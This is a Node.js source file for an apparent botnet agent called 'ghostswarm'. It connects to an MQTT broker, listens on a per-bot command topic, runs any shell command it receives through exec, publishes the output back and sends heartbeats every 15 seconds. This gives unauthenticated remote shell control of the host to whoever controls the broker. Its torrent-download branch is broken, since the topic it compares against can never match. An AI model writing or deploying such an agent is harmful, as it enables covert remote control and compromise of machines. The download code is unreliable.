const mqtt = require('mqtt');
const { exec } = require('child_process');

const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';

const fs = require("fs");

let botId;
try {
   botId = fs.readFileSync("/host_hostname", "utf8").trim();
} catch {
   botId = require("os").hostname(); // fallback
}

console.log(`🤖 [${botId}] connecting to MQTT broker at ${MQTT_BROKER}`);
const mqttClient = mqtt.connect(MQTT_BROKER);

mqttClient.on('connect', () => {
   console.log(`🤖 [${botId}] connected to MQTT`);
   const topic = `ghostswarm/${botId}/command`;
   mqttClient.subscribe(topic, { qos: 1 }, (err) => {
      if (err) {
         console.error(`❌ [${botId}] failed to subscribe:`, err);
      } else {
         console.log(`📡 [${botId}] subscribed to ${topic}`);
      }
   });
   mqttClient.subscribe(`ghostswarm/${botId}/download`, { qos: 1 }, (err) => {
      if (err) {
         console.error(`❌ [${botId}] failed to subscribe to download topic:`, err);
      } else {
         console.log(`📡 [${botId}] subscribed to ghostswarm/${botId}/download/+`);
      }
   });
});

mqttClient.on('message', (topic, message) => {

   try {
      if (topic == `ghostswarm/${botId}/command`) {
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] received:`, payload);

         const statusTopic = `ghostswarm/${botId}/status`;

         // Handle different message types
         if (payload.type === 'shell' && payload.cmd) {
            // Execute shell command
            exec(payload.cmd, (err, stdout, stderr) => {
               mqttClient.publish(statusTopic, JSON.stringify({
                  requestId: payload.requestId,
                  output: err ? stderr || 'Command failed' : stdout.trim(),
                  status: err ? 'error' : 'ok',
                  time: Date.now()
               }));
               console.log(`📤 [${botId}] shell command executed and responded`);
            });
         } else {
            // General echo response for non-shell commands
            mqttClient.publish(statusTopic, JSON.stringify({
               received: payload,
               status: "ok",
               time: Date.now()
            }));
            console.log(`📤 [${botId}] responded to status`);
         }

      } else if (topic == `ghostswarm/${botId}/download/+`) {
         // download torrent 
         // Note: The + wildcard allows for more specific topics like ghostswarm/bot123/download/abc123

         const hash = topic.split('/').pop(); // get the last part of the topic
         const payload = JSON.parse(message.toString());
         console.log(`📥 [${botId}] received download request`, payload);

         // save torrent data to file
         const torrentPath = `torrents/${hash}.json`;
         fs.mkdirSync('torrents', { recursive: true }); // ensure directory exists
         fs.writeFileSync(torrentPath, JSON.stringify(payload, null, 2));
         console.log(`📂 [${botId}] saved torrent to ${torrentPath}`);

         // Respond with success
      }
   } catch (err) {
      console.error(`❌ [${botId}] failed to handle message`, err);

      // Send error response
      const statusTopic = `ghostswarm/${botId}/status`;
      mqttClient.publish(statusTopic, JSON.stringify({
         status: "error",
         error: err.message,
         time: Date.now()
      }));
   }
});


function heartbeat() {
   const statusTopic = `ghostswarm/status/${botId}`;
   mqttClient.publish(statusTopic, JSON.stringify({
      status: "alive",
      time: Date.now()
   }));
   console.log(`❤️ [${botId}] heartbeat sent`);
}

heartbeat(); // send initial heartbeat
setInterval(heartbeat, 15000); // send heartbeat every 15 seconds